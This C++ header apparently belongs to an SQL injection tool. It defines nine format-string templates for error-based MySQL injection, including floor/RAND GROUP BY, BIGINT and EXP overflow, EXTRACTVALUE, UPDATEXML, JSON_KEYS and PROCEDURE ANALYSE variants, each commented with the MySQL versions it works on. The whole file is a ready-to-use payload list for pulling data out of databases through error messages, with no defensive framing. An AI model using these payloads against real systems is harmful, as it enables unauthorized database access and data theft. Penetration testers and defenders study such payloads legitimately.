//
// Created by zerte on 5/3/2020.
//

#ifndef XDG_ERROR_H
#define XDG_ERROR_H

#include <string>
#include <vector>

namespace Injection::MySQL::Error {
    const std::vector<std::string> _vectors {
            "%s %s (SELECT 5808 FROM(SELECT COUNT(*),CONCAT(0x%s,(%s),0x%s,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)%s", //MySQL >= 5.0 "floor_schema"
            "%s %s (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x%s,(%s),0x%s,0x78))s), 8446744073709551610, 8446744073709551610)))%s", //MySQL >= 5.5 "bigint"
            "%s %s EXP(~(SELECT * FROM (SELECT CONCAT(0x%s,(%s),0x%s,0x78))x))%s", //MySQL >= 5.5 "exp"
            "%s %s JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x%s,(%s),0x%s)) USING utf8)))%s", //MySQL >= 5.7.8 "json"
            "%s %s EXTRACTVALUE(2030,CONCAT(0x5c,0x%s,(%s),0x%s))%s", //MySQL >= 5.1 "extract"
            "%s%sPROCEDURE ANALYSE(EXTRACTVALUE(8971,CONCAT(0x5c,0x%s,(%s),0x%s)),1)%s", // Generic "extract_generic"
            "%s %s UPDATEXML(5947,CONCAT(0x2e,0x%s,(%s),0x%s),5431)%s", //MySQL >= 5.1 "xml"
            "%s %s ROW(2018,1386)>(SELECT COUNT(*),CONCAT(0x%s,(%s),0x%s,FLOOR(RAND(0)*2))x FROM (SELECT 2027 UNION SELECT 8505 UNION SELECT 7491 UNION SELECT 4808)a GROUP BY x)%s", // MYSQL >= 4.1 "floor_union"
            "%s %s 1 GROUP BY CONCAT(0x%s,(%s),0x%s,FLOOR(RAND(0)*2)) HAVING MIN(0)#%s", // Generic "floor_generic"
    };
};


#endif //XDG_ERROR_H
